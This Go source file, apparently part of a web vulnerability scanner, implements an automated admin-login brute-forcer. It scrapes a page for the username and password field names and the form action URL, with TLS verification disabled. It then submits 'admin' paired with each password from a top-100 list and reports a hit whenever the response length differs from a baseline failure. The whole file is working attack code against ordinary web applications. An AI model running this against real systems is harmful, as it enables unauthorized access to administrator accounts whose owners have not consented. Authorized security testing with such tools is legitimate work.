package brute

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func getinput(domainurl string) (usernamekey string, passwordkey string, domainurlx string) {
	var tr *http.Transport
	if HttpProxy != "" {
		uri, _ := url.Parse(HttpProxy)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(uri),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	client := &http.Client{
		Timeout:   time.Duration(5) * time.Second,
		Transport: tr,
	}

	req, err := http.NewRequest(strings.ToUpper("GET"), domainurl, strings.NewReader(""))
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
	} else {
		return "", "", ""
	}
	var username = "username"
	var password = "password"
	var loginurl = resp.Request.URL.String() + "/login"
	data, _ := ioutil.ReadAll(resp.Body)
	userreg := regexp.MustCompile(`<input.*name="(name|user.*?|User.*?)".*>`)
	usernamelist := userreg.FindStringSubmatch(string(data))
	if usernamelist != nil {
		username = usernamelist[len(usernamelist)-1:][0]
	}

	passreg := regexp.MustCompile(`<input.*name="(pass.*?|Pass.*?)".*>`)
	passlist := passreg.FindStringSubmatch(string(data))
	if passlist != nil {
		password = passlist[len(passlist)-1:][0]
	}

	domainreg := regexp.MustCompile(`<form.*action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(string(data))
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = domainx
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = u.Scheme + "://" + u.Host + domainlist[len(domainlist)-1:][0]
		} else {
			loginurl = domainurl + "/" + domainlist[len(domainlist)-1:][0]
		}
	} else {
		domainreg2 := regexp.MustCompile(`url:.*?"(.*?)"`)
		domainlist2 := domainreg2.FindStringSubmatch(string(data))
		if domainlist2 != nil {
			domainx := domainlist2[len(domainlist2)-1:][0]
			if strings.Contains(domainx, "http") {
				loginurl = domainx
			} else if domainx == "" {
				loginurl = loginurl
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = u.Scheme + "://" + u.Host + domainlist2[len(domainlist2)-1:][0]
			} else {
				loginurl = domainurl + "/" + domainlist2[len(domainlist2)-1:][0]
			}
		}
	}
	return username, password, loginurl
}

func Admin_brute(url string) (username string, password string, loginurl string) {
	usernamekey, passwordkey, loginurl := getinput(url)
	if loginurl != "" {
		if req, err := httpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey)); err == nil {
			for passi := range top100pass {
				if req2, err2 := httpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=%s", usernamekey, passwordkey, top100pass[passi])); err2 == nil {
					if req2.ContentLength != req.ContentLength {
						fmt.Println()
						fmt.Printf("admin-brute-sucess|admin:%s--%s", top100pass[passi], loginurl)
						fmt.Println()
						return "admin", top100pass[passi], loginurl
					}
				}
			}
		}
	}
	return "", "", ""
}
